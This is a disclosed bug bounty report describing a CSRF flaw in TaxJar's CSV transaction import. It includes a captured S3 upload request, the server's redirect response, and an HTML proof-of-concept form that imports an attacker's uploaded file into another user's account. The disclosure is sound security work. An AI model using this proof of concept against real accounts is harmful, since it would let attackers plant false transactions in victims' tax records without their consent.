# CSRF in Importing CSV files [app.taxjar.com]

## Report Details
- **Report ID**: 1637761
- **URL**: https://hackerone.com/reports/1637761
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-07-15T13:02:10.952Z
- **Disclosed**: 2023-03-16T20:49:56.278Z

## Reporter
- **Username**: bashcancare
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: stripe

## Vulnerability Information
Greetings!

Basically, app.taxjar.com has a feature where we can import Transactions from CSV files. I've found that there is lack of CSRF protection in importing CSV documents. I was able to successfully craft a CSRF request.


## Steps to reproduce

1. Go to app.taxjar.com
2. Create two accounts. Alex and Attacker
3. From attacker, upload CSV document and intercept request
4. The request will look like this...

```
POST / HTTP/1.1
Host: taxjar-prod-bucket.s3.amazonaws.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.taxjar.com/
Content-Type: multipart/form-data; boundary=---------------------------211004162938951800283798959588
Content-Length: 4343
Origin: https://app.taxjar.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="utf8"

âœ“
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="key"

uploads/e996ac74-689e-4fae-872b-16c537050062/${filename}
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="acl"

bucket-owner-full-control
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="policy"

eyJleHBpcmF0aW9uIjoiMjAyMi0wNy0xNVQyMjo1NzoxOVoiLCJjb25kaXRpb25zIjpbWyJzdGFydHMtd2l0aCIsIiR1dGY4IiwiIl0sWyJzdGFydHMtd2l0aCIsIiRrZXkiLCJ1cGxvYWRzL2U5OTZhYzc0LTY4OWUtNGZhZS04NzJiLTE2YzUzNzA1MDA2Mi8iXSx7IlgtQW16LUFsZ29yaXRobSI6IkFXUzQtSE1BQy1TSEEyNTYifSx7IlgtQW16LUNyZWRlbnRpYWwiOiJBS0lBVTJNR1NaQVVTWVhSR0dBTy8yMDIyMDcxNS91cy1lYXN0LTEvczMvYXdzNF9yZXF1ZXN0In0seyJYLUFtei1EYXRlIjoiMjAyMjA3MTVUMTI1NzE5WiJ9LHsiYnVja2V0IjoidGF4amFyLXByb2QtYnVja2V0In0seyJhY2wiOiJidWNrZXQtb3duZXItZnVsbC1jb250cm9sIn0seyJzdWNjZXNzX2FjdGlvbl9yZWRpcmVjdCI6Imh0dHBzOi8vYXBwLnRheGphci5jb20vY3N2X2ltcG9ydHMvdXBsb2FkX2NvbXBsZXRlIn0sWyJjb250ZW50LWxlbmd0aC1yYW5nZSIsMSw1MjQyODgwMF1dfQ==
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="X-Amz-Signature"

cdf6518c0ff866ce94128a4b9b3836c2e367650c319c4a98d92e300474775b62
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="X-Amz-Credential"

AKIAU2MGSZAUSYXRGGAO/20220715/us-east-1/s3/aws4_request
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="X-Amz-Algorithm"

AWS4-HMAC-SHA256
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="X-Amz-Date"

20220715T125719Z
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="success_action_redirect"

https://app.taxjar.com/csv_imports/upload_complete
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="file"; filename="CSV_V1_Template.csv"
Content-Type: application/vnd.ms-excel

provider,order_id,transaction_type,transaction_reference_id,completed_at,customer_name,shiptostreet,shiptocity,shiptostate,shiptozip,shiptocountrycode,from_street,from_city,from_state,from_zip,from_country,shipping_amount,handling_amount,discount_amount,total_sale,sales_tax,exemption_type
web,v1_order_one,Order,,2019-05-04 15:20:47 UTC,Vanellope von Schweetz,4301 Roxboro Rd,Durham,NC,27704,US,4301 Roxboro Rd,Durham,NC,27704,US,$8.00,0,0,$113.94,$10.80,
web,v1_full_refund,Refund,v1_order_one,5/5/2019,Vanellope von Schweetz,4301 Roxboro Rd,Durham,NC,27704,US,4301 Roxboro Rd,Durham,NC,27704,US,-8,0,0,-113.94,-10.8,
web,v1_order_with_refund,Order,,5/15/2019 3:06,Vanellope von Schweetz,4301 Roxboro Rd,Durham,NC,27704,US,4301 Roxboro Rd,Durham,NC,27704,US,8,0,0,113.94,10.8,
web,v1_partial_refund_one,Refund,v1_order_with_refund,5/16/2019,Vanellope von Schweetz,4301 Roxboro Rd,Durham,NC,27704,US,4301 Roxboro Rd,Durham,NC,27704,US,-1,0,0,-1,-0.8,
web,v1_partial_refund_two,Refund,v1_order_with_refund,2019-05-16 16:16:31 PST,Vanellope von Schweetz,4301 Roxboro Rd,Durham,NC,27704,US,4301 Roxboro Rd,Durham,NC,27704,US,-7,0,0,-112.94,-10,
web,v1_government_exempt,Order,,2019-05-05,Vanellope von Schweetz,4301 Roxboro Rd,Durham,NC,27704,US,4301 Roxboro Rd,Durham,NC,27704,US,$8.00,0,0,$113.94,0,government
web,v1_other_exempt,Order,,2019-05-05,Vanellope von Schweetz,4301 Roxboro Rd,Durham,NC,27704,US,4301 Roxboro Rd,Durham,NC,27704,US,$8.00,0,0,$113.94,0,other
web,v1_non_exempt_order,Order,,2019-05-05,Vanellope von Schweetz,4301 Roxboro Rd,Durham,NC,27704,US,4301 Roxboro Rd,Durham,NC,27704,US,$8.00,0,0,$113.94,$10.80,non_exempt
web,v1_wholesale_exempt,Order,,2019-05-05,Vanellope von Schweetz,4301 Roxboro Rd,Durham,NC,27704,US,4301 Roxboro Rd,Durham,NC,27704,US,$8.00,0,0,$113.94,0,wholesale
ebay,v1_marketplace_exempt,Order,,2019-05-02,Vanellope von Schweetz,325 Grove St,Jersey City,NJ,07302,US,325 Grove St,Jersey City,NJ,07302,US,3,3.3,0,102,2.3,marketplace
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="commit"

Upload spreadsheet
-----------------------------211004162938951800283798959588--

```
5. Right click on the request > Do Intercept > Response to this Requets
6. Server will send a response like this

```
HTTP/1.1 303 See Other
x-amz-id-2: MJfWMx2yTnmzg7tbPUlbMLwHCuGJ1bc4MFbj9grzTnwllI0vCEPjDmyWwlpbCTH5RocOPMzjt14=
x-amz-request-id: 4GHN118T2HRAEAQD
Date: Fri, 15 Jul 2022 12:59:06 GMT
ETag: "08ce40c27af955f3cae668e9785abd3e"
Location: https://app.taxjar.com/csv_imports/upload_complete?bucket=taxjar-prod-bucket&key=uploads%2Fe996ac74-689e-4fae-872b-16c537050062%2FCSV_V1_Template.csv&etag=%2208ce40c27af955f3cae668e9785abd3e%22
Server: AmazonS3
Content-Length: 0
Connection: close
```
7. Copy the link in Location header and paste it to alex's account.
8. You will see a file will be imported to her account. 

## POC

```
<!DOCTYPE html>
<html>
<body>
	<form method="GET" action="https://app.taxjar.com/csv_imports/upload_complete?bucket=taxjar-prod-bucket&key=uploads%2Fc73ea1e5-2fa4-4bbe-8f76-d3dfaac39e6f%2FCSV_V2_Template.csv&etag=%22ae5b1f53b6fc912a0980360c0314bdaa%22">
		<input type="text" name="bucket" value="taxjar-prod-bucket">
		<input type="text" name="key" value="uploads/c73ea1e5-2fa4-4bbe-8f76-d3dfaac39e6f/CSV_V2_Template.csv">
                <input type="text" name="etag" value="%22ae5b1f53b6fc912a0980360c0314bdaa%22">
	<input type="submit" value="Send">
	</form>
</body>
</html>
```

## Impact

CSRF attack, Attacker can import Transactions into user's account without his / her permission.

## Attachments
No attachments
